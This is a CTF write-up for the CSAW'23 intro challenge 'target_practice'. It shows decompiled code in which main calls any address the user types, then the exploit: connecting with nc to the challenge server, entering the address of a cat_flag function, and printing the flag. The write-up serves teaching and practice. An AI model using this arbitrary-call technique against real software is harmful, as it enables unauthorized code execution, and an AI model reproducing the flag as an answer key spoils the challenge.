# CSAW'23

## target_practice

> 
> Aim carefully... This pwnie can JUMP!
>
>  Author: ElykDeer
>
> [`target_practice`](target_practice)

Tags: _intro_

## Solution
For this challenge we get a binary which we can analyze with `Ghidra`. We can see that the `main` requires the user to input a number in hexadecimal format (the format string is actually `%lx`). Then `dereferences` the number and invokes a function call. This basically means we can enter any address to any function and let `main` call it for us.

```c
undefined8 main(void)
{
  long in_FS_OFFSET;
  code *local_20;
  code *local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  fflush(stdout);
  fflush(stdin);
  printf("Aim carefully.... ");
  __isoc99_scanf(&DAT_00400895,&local_20);
  local_18 = local_20;
  (*local_20)();
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

If we go through the rest of the functions we find `cat_flag`. Now this is a good candidate to call. In Ghidra we can see the function is at `0x00400717` and since the application is built with no `PIE` we can just use this address as it (as the image base doesn't change).

```c
void cat_flag(void)
{
  system("cat /flag.txt");
  return;
}
```

Let's try this...

```bash
$ nc intro.csaw.io 31138
Aim carefully.... 0x00400717
csawctf{y0ure_a_m4s7er4im3r}
```

Flag `csawctf{y0ure_a_m4s7er4im3r}`